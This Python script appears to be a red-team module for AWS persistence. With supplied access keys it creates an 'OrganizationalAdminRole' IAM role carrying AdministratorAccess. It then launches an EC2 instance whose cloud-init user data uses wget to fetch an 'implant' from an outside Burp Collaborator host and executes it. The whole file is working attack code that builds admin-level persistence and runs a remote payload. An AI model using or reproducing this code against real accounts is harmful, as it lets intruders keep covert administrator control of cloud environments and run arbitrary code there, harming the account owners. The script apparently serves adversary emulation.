# AWS TTP Persistence / Persistence using EC2 and role.
# CreateUser DeleteUser CreateAccessKey DeleteAccessKey
# Hashicorp Red
import boto3
import time
import json

region = "us-west-2"
payload_url = 'http://nlcuto0tw09pnlu573pvaabek5qvek.burpcollaborator.net'

def listActions():
    print('CreatePolicy ✓')
    print('CreateRole ✓')
    print('RunInstances ✓')
    print('RunCommand ✓')

def create_role(ak,sk):
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
    client = session.client('iam')
    with open('modules/policies/trust.json') as json_file:
        trust_json = json.load(json_file)
    client.create_role(
        RoleName='OrganizationalAdminRole',
        AssumeRolePolicyDocument=json.dumps(trust_json)
    )
    time.sleep(2)
    client.attach_role_policy(
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess',
        RoleName='OrganizationalAdminRole'
    )
    client.create_instance_profile(
        InstanceProfileName='OrganizationalAdminRole'
    )
    client.add_role_to_instance_profile (
        InstanceProfileName = 'OrganizationalAdminRole',
        RoleName            = 'OrganizationalAdminRole' 
    )
    return True

def ec2userdata_persist(ak,sk):
    print('\nExecuting EC2 CreateInstance Persistence (UserData):')
    create_role(ak,sk)
    time.sleep(15)
    # Use supplied iam keys
    session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
    ec2 = session.resource('ec2')
    userdata = """#cloud-config
            runcmd:
            - mkdir /tmp/implant
            - cd /tmp/implant
            - wget -O implant %s
            - ./implant
        """ % payload_url
    ec2.create_instances(
        ImageId='ami-003634241a8fcdec0', 
        MinCount=1, MaxCount=1, 
        UserData=userdata, 
        IamInstanceProfile={
        'Name': 'OrganizationalAdminRole'
        })
    time.sleep(5)
    listActions()
    return True